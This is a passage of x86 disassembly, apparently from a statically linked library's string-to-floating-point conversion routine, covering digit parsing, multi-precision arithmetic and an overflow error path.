test ebx, ebx
jle 0x808ab49
lea edx, [var_82ch]
lea ecx, [var_104ch]
mov edi, 1
mov dword [var_10c0h], edx
mov dword [var_10c4h], ecx
mov dword [var_10c8h], 0x80a7020
test edi, ebx
je 0x808ab26
mov eax, dword [var_10c8h]
mov edx, dword [var_1070h]
xor ebx, edi
mov dword [var_106ch], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x808baea
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_10c4h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_10c0h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_1070h]
add eax, esi
test edx, edx
mov dword [var_1070h], eax
jne 0x808ab08
dec eax
mov dword [var_1070h], eax
mov eax, dword [var_10c0h]
mov esi, dword [var_10c4h]
mov ebx, dword [var_106ch]
mov dword [var_10c0h], esi
mov dword [var_10c4h], eax
add edi, edi
add dword [var_10c8h], 0x10
test ebx, ebx
jne 0x808aa96
lea eax, [var_104ch]
cmp dword [var_10c0h], eax
je 0x808bace
mov edx, dword [var_1070h]
bsr ecx, dword [ebp + edx*4 - 0x830]
xor ecx, 0x1f
mov eax, edx
mov dword [var_10cch], edx
shl eax, 5
sub eax, ecx
cmp eax, 0x4000
mov dword [var_1080h], eax
jle 0x808ab84
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x808a6fc
cmp dword [var_1080h], 0x40
jle 0x808ad00
mov edx, dword [var_1080h]
mov eax, dword [var_1080h]
mov dword [var_10d4h], 0x1f
sub edx, 0x21
sub eax, 0x40
mov esi, eax
mov edi, eax
cmovs esi, edx
sar esi, 5
mov edx, esi
lea ecx, [esi - 1]
shl edx, 5
sub edi, edx
cmovne ecx, esi
lea eax, [edi - 1]
test edi, edi
cmove eax, dword [var_10d4h]
mov dword [var_10d0h], ecx
mov dword [var_10d4h], eax
jne 0x808ac78
mov eax, dword [ebp + esi*4 - 0x82c]
mov dword [var_1068h], eax
mov eax, dword [ebp + esi*4 - 0x828]
mov dword [var_1064h], eax
mov eax, dword [var_82ch]
xor ebx, ebx
test eax, eax
jne 0x808ac14
inc ebx
mov eax, dword [ebp + ebx*4 - 0x82c]
test eax, eax
je 0x808ac08
xor eax, eax
mov esi, dword [var_1090h]
cmp dword [var_1094h], esi
jl 0x808ac2c
cmp ebx, dword [var_10d0h]
jge 0x808ac31
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_10d0h]
mov ecx, dword [var_1074h]
mov eax, dword [var_10d4h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0x82c]
mov dword [var_ch], eax
mov eax, dword [var_1080h]
dec eax
lea esi, [var_1068h]
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08089f80
jmp 0x808a5c6
mov eax, dword [var_10cch]
mov ebx, esi
dec eax
cmp esi, eax
jge 0x808acde
mov dword [var_10d8h], eax
mov dword [var_10dch], 0x20
lea eax, [var_1068h]
sub dword [var_10dch], edi
mov dword [var_1124h], eax
mov edx, dword [ebp + ebx*4 - 0x82c]
mov ecx, edi
mov eax, dword [ebp + ebx*4 - 0x828]
inc ebx
shr edx, cl
movzx ecx, byte [var_10dch]
shl eax, cl
or edx, eax
mov eax, dword [var_1124h]
mov dword [eax], edx
add eax, 4
cmp ebx, dword [var_10d8h]
mov dword [var_1124h], eax
jl 0x808aca7
mov eax, ebx
sub eax, esi
dec eax
jg 0x808abfc
mov eax, dword [ebp + ebx*4 - 0x82c]
mov ecx, edi
shr eax, cl
jmp 0x808abf6
lea esi, [esi]
mov eax, dword [var_1094h]
cmp dword [var_1090h], eax
je 0x808b95b
mov ecx, dword [var_10cch]
lea esi, [var_82ch]
lea edi, [var_1068h]
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_1070h]
cmp eax, 1
jle 0x808b94b
mov esi, 0x42
lea edx, [var_104ch]
lea ecx, [var_82ch]
sub esi, dword [var_1080h]
mov dword [var_10ech], edx
mov dword [var_10f0h], ecx
mov edx, 0x55555556
mov ecx, dword [var_1090h]
mov dword [var_10f4h], 0x80a7020
sub ecx, dword [var_1094h]
mov dword [var_10e8h], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x808adb0
mov ecx, dword [var_1094h]
mov dword [var_10e8h], 1
lea edx, [edx + ecx + 2]
mov dword [var_1090h], edx
mov esi, dword [var_1090h]
mov dword [var_107ch], 0
sub esi, dword [var_1094h]
sub esi, ebx
mov ebx, 1
mov dword [var_10e4h], esi
test dword [var_10e4h], ebx
je 0x808ae1b
mov eax, dword [var_107ch]
xor dword [var_10e4h], ebx
test eax, eax
jne 0x808b8cf
mov eax, dword [var_10f4h]
mov edi, dword [var_10ech]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_107ch], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_10e4h]
add ebx, ebx
add dword [var_10f4h], 0x10
test eax, eax
jne 0x808add3
lea eax, [var_82ch]
cmp dword [var_10ech], eax
je 0x808b8b3
mov edx, dword [var_10a0h]
mov esi, dword [var_109ch]
lea eax, [var_106ch]
mov ecx, dword [var_10a8h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_1070h]
mov esi, dword [var_1094h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_1090h], esi
mov edx, dword [var_1084h]
lea ecx, [var_82ch]
mov eax, dword [var_1090h]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0808a220
mov ecx, dword [var_107ch]
bsr eax, dword [ebp + ecx*4 - 0x1050]
mov ebx, eax
xor ebx, 0x1f
jle 0x808af09
lea esi, [var_104ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_1070h]
lea edx, [var_82ch]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x808af09
mov eax, dword [var_1070h]
mov dword [ebp + eax*4 - 0x82c], edx
inc eax
mov dword [var_1070h], eax
cmp dword [var_107ch], 1
mov esi, dword [var_1080h]
mov dword [var_106ch], esi
je 0x808b75b
cmp dword [var_107ch], 2
je 0x808b45a
mov eax, dword [var_107ch]
mov ecx, dword [var_107ch]
mov dword [var_110ch], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x1054]
mov esi, dword [ebp + eax*4 - 0x1050]
mov eax, dword [var_1070h]
mov dword [var_1108h], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x104c]
mov dword [var_4h], eax
lea eax, [var_82ch]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x808af9c
mov eax, dword [var_1070h]
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
mov dword [var_1070h], eax
mov eax, dword [var_1070h]
cmp eax, dword [var_107ch]
jge 0x808b438
mov edx, dword [var_107ch]
sub edx, eax
mov dword [var_1110h], edx
mov edx, dword [var_1080h]
test edx, edx
jle 0x808b3e1
mov eax, dword [var_1110h]
shl eax, 5
add eax, dword [var_1080h]
cmp eax, 0x40
jg 0x808b31e
mov ecx, dword [var_1070h]
mov eax, dword [var_1068h]
mov dword [var_1068h], 0
test ecx, ecx
mov dword [var_1064h], eax
jle 0x808b01e
mov eax, dword [var_1110h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x830]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x82c], eax
jg 0x808b002
mov edx, dword [var_1110h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x808b03b
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
cmp eax, edx
jl 0x808b02b
shl dword [var_1110h], 5
mov edx, dword [var_1110h]
add dword [var_1080h], edx
mov eax, dword [var_107ch]
cmp dword [var_1080h], 0x40
mov dword [ebp + eax*4 - 0x104c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0x82c]
mov ebx, eax
jg 0x808b1e6
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_111ch], ecx
mov dword [var_1118h], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x808b0e7
mov edx, dword [var_107ch]
mov eax, dword [ebp + edx*4 - 0x830]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_1108h]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x808b300
add ecx, esi
dec edi
cmp ecx, esi
jb 0x808b0e7
cmp ebx, dword [var_1108h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_1108h]
cmp edx, ecx
ja 0x808b0b9
jne 0x808b0e7
mov eax, dword [var_107ch]
cmp ebx, dword [ebp + eax*4 - 0x834]
ja 0x808b0b9
mov edx, dword [var_111ch]
lea ecx, [var_104ch]
lea eax, [var_82ch]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_107ch]
cmp dword [ebp + edx*4 - 0x82c], eax
je 0x808b13d
lea eax, [var_82ch]
lea ecx, [var_104ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_107ch]
mov edx, dword [var_1118h]
mov eax, dword [ebp + ecx*4 - 0x830]
test edx, edx
mov dword [ebp + ecx*4 - 0x82c], eax
mov ebx, eax
jle 0x808b170
mov eax, dword [ebp + edx*4 - 0x830]
mov dword [ebp + edx*4 - 0x82c], eax
dec edx
test edx, edx
jg 0x808b15d
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b273
test edi, edi
mov edx, 0x20
je 0x808b18d
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b253
add edx, 0x40
mov eax, edi
mov dword [var_1120h], 0x61
sub ecx, edx
mov dword [var_110ch], edx
shr eax, cl
mov dword [var_1068h], eax
mov ecx, dword [var_1120h]
cmp ecx, 0x40
mov dword [var_1080h], ecx
jle 0x808b089
mov esi, dword [var_107ch]
mov eax, dword [ebp + esi*4 - 0x82c]
test eax, eax
mov edx, dword [var_107ch]
jne 0x808b204
test edx, edx
js 0x808b204
dec edx
mov ebx, dword [ebp + edx*4 - 0x82c]
test ebx, ebx
jne 0x808b204
test edx, edx
jns 0x808b1f4
mov ecx, dword [var_10e8h]
xor eax, eax
test ecx, ecx
jne 0x808b214
test edx, edx
js 0x808b219
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_1068h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_110ch]
mov dword [var_10h], eax
mov eax, dword [var_1074h]
mov dword [var_8h], eax
mov eax, dword [var_106ch]
dec eax
mov dword [var_4h], eax
jmp 0x808ac6e
neg edx
mov dword [var_1064h], 0
mov dword [var_1068h], edi
add edx, 0x20
mov dword [var_1120h], edx
jmp 0x808b1c4
mov eax, dword [var_1080h]
add eax, 0x20
cmp eax, 0x40
mov dword [var_1120h], eax
jg 0x808b29e
mov eax, dword [var_1068h]
mov dword [var_1068h], edi
mov dword [var_1064h], eax
jmp 0x808b1c4
mov dword [var_110ch], 0x40
mov edx, dword [var_1080h]
sub dword [var_110ch], edx
mov eax, dword [var_110ch]
test eax, eax
jle 0x808b1c4
mov ecx, dword [var_110ch]
lea eax, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_110ch]
shr eax, cl
or dword [var_1068h], eax
jmp 0x808b1c4
jne 0x808b0e7
mov eax, dword [var_107ch]
cmp ebx, dword [ebp + eax*4 - 0x834]
ja 0x808b0b9
jmp 0x808b0e7
mov dword [var_110ch], 0x40
mov edx, dword [var_1080h]
sub dword [var_110ch], edx
cmp dword [var_110ch], 0x1f
jle 0x808b3aa
mov ebx, dword [var_110ch]
mov ecx, dword [var_110ch]
mov dword [var_8h], 2
add ebx, 0x1f
cmp dword [var_110ch], 0xffffffff
cmovg ebx, dword [var_110ch]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_1068h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x1068]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x808b03b
lea edx, [ebp + eax*4 - 0x1068]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x808b399
jmp 0x808b03b
mov eax, dword [var_110ch]
test eax, eax
jle 0x808b03b
mov edx, dword [var_110ch]
lea ecx, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x808b03b
test eax, eax
mov ecx, eax
jle 0x808b403
mov eax, dword [var_1110h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x830]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x82c], eax
jg 0x808b3e7
mov edx, dword [var_1110h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x808b420
mov dword [ebp + eax*4 - 0x82c], 0
inc eax
cmp eax, edx
jl 0x808b410
shl dword [var_1110h], 5
mov edx, dword [var_1110h]
sub dword [var_106ch], edx
jmp 0x808b04e
test eax, eax
mov edx, eax
jle 0x808b04e
mov eax, dword [ebp + edx*4 - 0x830]
mov dword [ebp + edx*4 - 0x82c], eax
dec edx
test edx, edx
jg 0x808b442
jmp 0x808b04e
cmp dword [var_1070h], 1
mov eax, dword [var_1048h]
mov dword [var_1100h], 0
mov dword [var_1104h], 0
mov edi, dword [var_104ch]
mov dword [var_10fch], eax
jle 0x808b6aa
mov esi, dword [var_828h]
mov ebx, dword [var_82ch]
cmp dword [var_1080h], 0x40
jg 0x808b56e
cmp esi, dword [var_10fch]
je 0x808b676
mov eax, ebx
mov edx, esi
div dword [var_10fch]
mov ecx, edx
mov dword [var_1100h], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x808b4d4
jne 0x808b4ed
test ebx, ebx
je 0x808b4ed
add ecx, dword [var_10fch]
dec dword [var_1100h]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_10fch]
jae 0x808b4ca
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b5df
mov eax, dword [var_1100h]
mov edx, 0x20
test eax, eax
je 0x808b51e
bsr edx, dword [var_1100h]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b5b9
mov eax, dword [ebp - 0x1100]
add edx, 0x40
mov dword [ebp - 0x1120], 0x61
sub ecx, edx
mov dword [ebp - 0x1104], edx
shr eax, cl
mov dword [ebp - 0x1068], eax
mov eax, dword [ebp - 0x1120]
cmp eax, 0x40
mov dword [ebp - 0x1080], eax
jle 0x808b4a6
mov ecx, dword [var_10e8h]
xor eax, eax
test ecx, ecx
jne 0x808b582
test esi, esi
jne 0x808b582
test ebx, ebx
je 0x808b587
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1100h]
mov eax, 0x1f
sub eax, dword [var_1104h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_1074h]
mov eax, dword [var_106ch]
mov dword [var_8h], ecx
jmp 0x808ac60
mov ecx, dword [ebp - 0x1100]
neg edx
mov dword [ebp - 0x1064], 0
add edx, 0x20
mov dword [ebp - 0x1120], edx
mov dword [ebp - 0x1068], ecx
jmp 0x808b559
mov eax, dword [var_1080h]
add eax, 0x20
cmp eax, 0x40
mov dword [var_1120h], eax
jg 0x808b610
mov eax, dword [var_1068h]
mov edx, dword [var_1100h]
mov dword [var_1064h], eax
mov dword [var_1068h], edx
jmp 0x808b559
mov dword [var_1104h], 0x40
mov ecx, dword [var_1080h]
sub dword [var_1104h], ecx
mov eax, dword [var_1104h]
test eax, eax
jle 0x808b559
mov eax, dword [ebp - 0x1104]
lea edx, [ebp - 0x1068]
mov dword [esp + 8], 2
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0x1100]
mov ecx, 0x20
sub ecx, dword [ebp - 0x1104]
shr eax, cl
or dword [ebp - 0x1068], eax
jmp 0x808b559
lea ecx, [esi + ebx]
mov dword [var_1100h], 0xffffffff
cmp ecx, esi
jb 0x808b69a
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x808b4ca
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x808b4f7
mov eax, dword [var_82ch]
cmp eax, dword [var_10fch]
jb 0x808b6c1
xor esi, esi
mov ebx, eax
jmp 0x808b499
mov ecx, dword [var_1080h]
test ecx, ecx
jle 0x808b74a
mov ebx, dword [var_1080h]
add ebx, 0x20
cmp ebx, 0x40
jg 0x808b704
mov eax, dword [var_1068h]
mov dword [var_1068h], 0
mov dword [var_1064h], eax
mov eax, dword [var_82ch]
mov dword [var_1080h], ebx
mov esi, eax
xor ebx, ebx
jmp 0x808b499
mov dword [var_1104h], 0x40
mov edx, dword [var_1080h]
sub dword [var_1104h], edx
mov edx, dword [var_1104h]
test edx, edx
jle 0x808b6f5
mov ecx, dword [var_1104h]
lea esi, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
jmp 0x808b6ef
mov ebx, dword [var_1080h]
sub ebx, 0x20
mov dword [var_106ch], ebx
jmp 0x808b6fb
mov dword [var_10f8h], 0
mov ebx, dword [var_82ch]
mov edi, dword [var_104ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b826
test esi, esi
mov edx, 0x20
je 0x808b798
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b809
add edx, 0x40
mov eax, esi
mov dword [var_1120h], 0x61
sub ecx, edx
mov dword [var_10f8h], edx
shr eax, cl
mov dword [var_1068h], eax
mov edx, dword [var_1120h]
cmp edx, 0x40
mov dword [var_1080h], edx
jle 0x808b771
mov edi, dword [var_10e8h]
xor eax, eax
test edi, edi
jne 0x808b7ec
test ebx, ebx
je 0x808b7f1
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_10f8h]
jmp 0x808b5a0
neg edx
mov dword [var_1064h], 0
mov dword [var_1068h], esi
add edx, 0x20
mov dword [var_1120h], edx
jmp 0x808b7cb
mov ecx, dword [var_1080h]
add ecx, 0x20
cmp ecx, 0x40
mov dword [var_1120h], ecx
jg 0x808b851
mov eax, dword [var_1068h]
mov dword [var_1068h], esi
mov dword [var_1064h], eax
jmp 0x808b7cb
mov dword [var_10f8h], 0x40
mov eax, dword [var_1080h]
sub dword [var_10f8h], eax
mov eax, dword [var_10f8h]
test eax, eax
jle 0x808b7cb
mov edx, dword [var_10f8h]
lea ecx, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_10f8h]
shr eax, cl
or dword [var_1068h], eax
jmp 0x808b7cb
mov ecx, dword [var_107ch]
lea edi, [var_104ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808ae40
mov edx, dword [var_10f4h]
mov ecx, dword [var_107ch]
mov esi, dword [var_10ech]
mov dword [var_10h], ecx
mov ecx, dword [var_10f0h]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_10ech]
mov esi, dword [var_10f4h]
mov edx, dword [var_107ch]
add edx, dword [esi + 4]
mov esi, dword [var_10f0h]
mov dword [var_10f0h], edi
mov dword [var_10ech], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_107ch], edx
jmp 0x808ae1b
mov dword [ebp + eax*4 - 0x1068], 0
jmp 0x808ad3c
mov eax, dword [var_1080h]
mov edx, dword [var_1080h]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_10e0h], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x1f
je 0x808ba80
cmp edx, 0x1e
jg 0x808ba1a
mov ecx, dword [var_10cch]
mov eax, 0x1f
mov ebx, 2
sub eax, edx
lea esi, [var_82ch]
mov dword [var_ch], eax
mov dword [var_4h], esi
mov eax, ebx
sub eax, ecx
mov dword [var_8h], ecx
lea eax, [ebp + eax*4 - 0x1068]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_1070h]
test eax, eax
jle 0x808b9e0
lea edx, [var_1068h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808b9d4
mov ecx, dword [var_1074h]
mov esi, dword [var_10e0h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], ecx
mov dword [var_4h], esi
lea eax, [var_1068h]
mov dword [esp], eax
jmp 0x808ac6e
lea eax, [edx - 0x1f]
lea edi, [var_1068h]
lea edx, [var_82ch]
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [var_10cch]
mov dword [var_8h], eax
mov eax, 2
sub eax, dword [var_10cch]
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, 1
sub edx, dword [var_1070h]
test edx, edx
mov dword [ebp + edx*4 - 0x1068], eax
jle 0x808b9e0
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x808ba6f
jmp 0x808b9e0
mov eax, 2
mov ecx, dword [var_10cch]
lea esi, [var_82ch]
mov edi, eax
sub edi, dword [var_10cch]
cld
shl ecx, 2
shr ecx, 2
lea edi, [ebp + edi*4 - 0x1068]
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_1070h]
test eax, eax
jle 0x808b9e0
lea edx, [var_1068h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808babd
jmp 0x808b9e0
mov ecx, dword [var_1070h]
lea edi, [var_82ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808ab49
mov dword [var_10h], edx
mov ecx, dword [var_10c0h]
mov dword [var_8h], esi
mov edx, dword [var_10c8h]
mov dword [var_ch], ecx
mov ecx, dword [var_10c4h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x808aae4
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x808a6a2
mov ecx, dword [var_1094h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x808a9ca
mov eax, ecx
jmp 0x808a9ca
mov eax, dword [var_1084h]
mov ecx, dword [arg_14h]
mov dword [var_10bch], 1
mov esi, 0x1f
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x808bb83
inc dword [var_1084h]
mov eax, dword [var_1084h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x808bb6a
cmp dl, 0x30
je 0x808bd41
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x808bd2a
inc dword [var_1084h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a6200]
dec dword [var_1090h]
mov dword [var_1080h], eax
mov eax, esi
sub eax, dword [var_1080h]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_1080h]
mov dword [var_1064h], edx
mov edx, dword [var_1094h]
lea eax, [ecx + edx*4]
add eax, dword [var_106ch]
lea ebx, [eax - 5]
mov eax, dword [var_1090h]
mov dword [var_106ch], ebx
test eax, eax
jle 0x808bc67
mov eax, dword [var_10bch]
lea ebx, [ebp + eax*4 - 0x1068]
mov ecx, dword [var_1084h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x808bc24
mov eax, dword [var_10a8h]
add ecx, eax
mov dword [var_1084h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x808bd13
inc dword [var_1084h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x808bcba
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_1090h]
mov eax, dword [var_1090h]
test eax, eax
jle 0x808bc67
mov eax, dword [var_10bch]
test eax, eax
jns 0x808bc00
mov ebx, dword [var_10bch]
test ebx, ebx
jle 0x808bc89
lea edx, [var_1068h]
mov eax, dword [var_10bch]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808bc7d
mov esi, dword [var_1074h]
mov eax, dword [var_106ch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], esi
mov dword [var_4h], eax
jmp 0x808ba0c
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_10bch]
js 0x808bce2
mov dword [ebx], edx
add esi, 0x1c
jmp 0x808bc4d
xor eax, eax
mov ecx, dword [var_1074h]
mov dword [var_10h], 0x1f
cmp dword [var_1090h], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_106ch]
jmp 0x808ac61
mov ecx, dword [arg_14h]
inc dword [var_1084h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808bc3b
mov ecx, dword [arg_14h]
inc dword [var_1084h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808bba3
inc dword [var_1084h]
mov ecx, dword [var_1084h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x808bd41
jmp 0x808bb8c
mov eax, dword [var_1098h]
mov edx, dword [var_106ch]
shl eax, 2
sub edx, eax
jmp 0x808a98a
test al, al
jne 0x808a922
jmp 0x808a95f
lea esi, [esi]
mov ecx, dword [var_109ch]
movzx eax, byte [ecx + 1]
jmp 0x808bd70
mov edx, dword [arg_ch]
test edx, edx
jne 0x808a69d
jmp 0x808a6a2
mov ecx, dword [arg_ch]
test ecx, ecx
je 0x808a6a2
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x808a6a2
mov eax, dword [var_109ch]
movzx eax, byte [eax]
mov byte [var_1112h], al
mov edx, dword [var_1090h]
xor eax, eax
test edx, edx
mov dword [var_1094h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_1112h], 0
mov dword [var_1098h], eax
je 0x808c147
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x808be09
mov edx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808bdf5
test al, al
jne 0x808c140
add edi, dword [var_10a8h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x808c0fd
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x808be52
mov eax, dword [var_1090h]
sub eax, dword [var_1094h]
cmp dword [var_1098h], 0xffffffff
cmovne eax, dword [var_1098h]
mov dword [var_1098h], eax
inc dword [var_1090h]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808be2b
cmp dword [var_1078h], 0x10
mov edx, esi
movsx eax, dl
jne 0x808be7e
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808be7e
cmp edx, 0x66
jle 0x808be2b
cmp dword [var_1078h], 0x10
mov dword [var_108ch], edi
je 0x808c0f4
cmp dword [ecx + eax*4], 0x65
je 0x808bf81
mov esi, dword [var_1094h]
cmp dword [var_1090h], esi
jle 0x808beb9
mov eax, dword [var_108ch]
cmp byte [eax - 1], 0x30
je 0x808bf64
mov ecx, dword [var_1094h]
cmp dword [var_1090h], ecx
jne 0x808a8bb
mov ebx, dword [var_1090h]
test ebx, ebx
jle 0x808a8bb
mov ebx, dword [var_106ch]
test ebx, ebx
jns 0x808a8bb
cmp dword [var_1078h], 0x10
je 0x808bf48
mov eax, dword [var_108ch]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x808bf40
cmp cl, 0x30
jne 0x808a8bb
dec dword [var_1090h]
inc ebx
dec dword [var_108ch]
mov ecx, dword [var_1090h]
dec dword [var_1094h]
mov dword [var_106ch], ebx
test ecx, ecx
